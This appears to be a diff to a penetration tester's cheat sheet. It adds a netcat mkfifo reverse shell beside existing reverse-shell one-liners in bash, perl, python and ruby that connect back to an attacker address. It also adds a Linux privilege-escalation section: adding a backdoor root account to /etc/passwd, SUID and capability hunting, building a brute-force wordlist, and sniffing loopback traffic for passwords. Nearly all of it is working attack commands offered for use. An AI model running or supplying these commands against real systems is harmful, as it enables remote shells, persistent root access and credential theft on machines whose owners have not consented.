@@ -6,6 +6,7 @@ nc -lnvp 1234
 On target: 
 nc 123.123.123.1 1234 -e /bin/bash
 bash -c "bash -i >& /dev/tcp/123.123.123.1/1234 0>&1"
+mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 123.123.123.1 1234 >/tmp/f
 #Thanks to O'Reilly for these: perl reverse shell depended on /bin/sh with tcp and udp and then one without /bin/sh
 perl -e 'use Socket;$i="123.123.123.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -e 'use Socket;$i="123.123.123.1";$p=1234;socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
@@ -16,3 +17,79 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
 On listening host: nc -lvnp 1234
+
+----
+
+#Version info
+cat /etc/issue
+cat /etc/os-release
+uname -a
+uname -r
+arch
+
+#Users and in some case passwords can be found in /etc/passwd, which can be exploited if for some reason you have writes to this file
+#/etc/passwd passwords precede /etc/shadow ones
+openssl passwd assword
+fFXEX2n561kQ2
+echo "root666:fFXEX2n561kQ2:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+#FW rules are might be saved locally
+cat /etc/iptables/rules.v2
+
+#Scheduled tasks
+ls -lah /etc/cron*
+crontab -l
+sudo crontab -l
+grep "CRON" /var/log/syslog
+
+#Installed apps
+dpkg -l
+apt list
+rpm -a
+
+#Find writable folders
+find / -type d -writable 2>/dev/null
+
+#List files with SUID bit set
+find / -perm -u=s -type f 2>/dev/null
+
+#Show sudoer powers
+sudo -l
+
+#Find binaries with setuid enabled, also need +ep flag to abuse (cap_setuid+ep)
+/usr/sbin/getcap -r / 2>/dev/null
+
+#List mounted/unmounted filesystems
+cat /etc/fstab
+mount
+
+#List available disks
+lsblk
+
+#List modules
+lsmod
+
+#Show module details
+/sbin/modinfo modulename
+
+#Show environment variables
+env
+
+#Create a passwordlist for bruteforcing: the list indices start with four digits and then the string "foo", all combinations are then automatically created
+#Min and max length both set to 7 characters
+crunch 7 7 -t %%%%foo > wordlist
+
+#run ps aux every 2 seconds and grep the results for something
+watch -n 2 "ps -aux | grep something"
+
+#Grep TCP traffic on loopback for the string "password" (requires sudo rights)
+sudo tcpdump -i lo  -A | grep "password"
+
+#Check app-armor status (requires root)
+aa-status
+
+#Too lazy to enumerate manually, try unix-privesc-check
+https://github.com/pentestmonkey/unix-privesc-check
+
+#Can't remember how to leverage what? Check gtfobins:
+https://gtfobins.github.io/
